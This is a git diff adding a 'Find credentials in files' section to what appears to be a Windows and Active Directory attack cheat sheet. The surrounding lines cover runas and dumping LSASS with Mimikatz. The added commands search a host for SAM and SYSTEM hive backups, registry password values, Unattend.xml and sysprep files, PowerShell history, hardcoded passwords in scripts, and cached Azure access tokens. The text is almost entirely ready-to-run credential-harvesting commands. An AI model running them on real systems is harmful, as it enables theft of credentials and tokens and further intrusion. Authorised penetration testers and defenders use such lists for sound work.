@@ -45,6 +45,42 @@ runas /netonly /user:<DOMAIN>\<USER> cmd.exe
 runas /netonly /user:<DOMAIN>\<USER> powershell.exe
 ```
 
+## Find credentials in files
+#### Find SAM files
+```
+Get-ChildItem -path C:\Windows\Repair\* -include *.SAM*,*.SYSTEM* -force -Recurse 
+Get-ChildItem -path C:\Windows\System32\config\RegBack\*  -include *.SAM*,*.SYSTEM* -force -Recurse
+```
+
+#### Check registery for passwords
+```
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
+#### Check unattend.xm; and sysgrep
+```
+Get-ChildItem -path C:\* -Recurse -Include *Unattend.xml*
+Get-ChildItem -path C:\Windows\Panther\* -Recurse -Include *Unattend.xml* 
+Get-ChildItem -path C:\Windows\system32\* -Recurse -Include *sysgrep.xml*, *sysgrep.inf* 
+```
+
+#### Look for powershell history files
+```
+Get-Childitem -Path C:\Users\* -Force -Include *ConsoleHost_history* -Recurse -ErrorAction SilentlyContinue
+```
+
+#### Look for hardcoded passwords in scripts
+```
+Get-ChildItem -path C:\*  -Recurse -Include *.xml,*.ps1,*.bat,*.txt  | Select-String "password"| Export-Csv C:\Scripts\Report.csv -NoTypeInformation
+Get-ChildItem -path C:\*  -Recurse -Include *.xml,*.ps1,*.bat,*.txt  | Select-String "creds"| Export-Csv C:\Scripts\Report.csv -NoTypeInformation
+```
+
+#### Check for Azure tokens
+```
+Get-ChildItem -path "C:\Users\*" -Recurse -Include *accessTokens.json*, *TokenCache.dat*, *AzureRmContext.json*
+```
+
 ## Dumping LSASS
 #### Dump credentials on a local machine using Mimikatz.
 ```
